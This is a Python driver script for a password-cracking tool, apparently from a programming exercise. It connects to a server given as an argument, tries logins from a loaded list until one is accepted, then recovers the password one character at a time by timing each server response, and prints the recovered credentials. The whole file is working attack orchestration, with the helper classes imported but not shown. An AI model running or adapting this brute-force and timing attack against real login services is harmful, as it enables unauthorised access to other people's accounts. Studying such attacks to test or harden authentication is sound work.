import argparse
from time import time

from hack_class import PasswordHacker
from logger_config import logger
from socket_client import SocketClient


def parse_command_line_arguments() -> tuple[str, str]:
    """
    Parses the command-line arguments to fetch the server's IP address and port.

    Logs an error message and exits if command-line arguments cannot be parsed.
    Logs an info message indicating successful parsing of command-line arguments.
    :return: Tuple containing the server's IP address and port.
    """
    parser = argparse.ArgumentParser()
    parser.add_argument('server_ip_address', help='IP address of the server')
    parser.add_argument('server_port', help='Port of the server')
    try:
        args = parser.parse_args()
    except SystemExit:
        logger.error(f'Failed to parse command line arguments')
        exit(1)
    else:
        logger.info('Command line arguments parsed successfully')
        return args.server_ip_address, args.server_port


def login_to_server(client: SocketClient, hacker: PasswordHacker) -> None:
    """
    Attempts to login to the server by sending serialized login data and checking the response.
    :param client: Instance of SocketClient class used to send and receive messages from the server.
    :param hacker: Instance of PasswordHacker class used to serialize login data and check login correctness.
    :return: None
    """
    for request in hacker.serialize_login_data():
        client.send_message(request)
        response = client.receive_message()
        if hacker.is_login_correct(response) is True:
            break


def crack_password(client: SocketClient, hacker: PasswordHacker) -> None:
    """
    Attempts to crack the password by sending serialized password data and checking the response.
    :param client: Instance of SocketClient class used to send and receive messages from the server.
    :param hacker: Instance of PasswordHacker class used to serialize password data and check password correctness.
    :return: None
    """
    while not hacker.password_correct:
        for request in hacker.serialize_password_data():
            start_time = time()
            client.send_message(request)
            response = client.receive_message()
            end_time = time()
            if hacker.is_char_in_password(response, end_time - start_time) is True:
                break


def main() -> None:
    """
    The main function that orchestrates the entire hacking process.
    :return: None
    """
    ip_address, port = parse_command_line_arguments()
    client = SocketClient(ip_address, int(port))
    client.connect()

    hacker = PasswordHacker()
    hacker.load_login_file()

    login_to_server(client, hacker)
    crack_password(client, hacker)

    client.close()
    hacker.show_credentials()


if __name__ == "__main__":
    main()
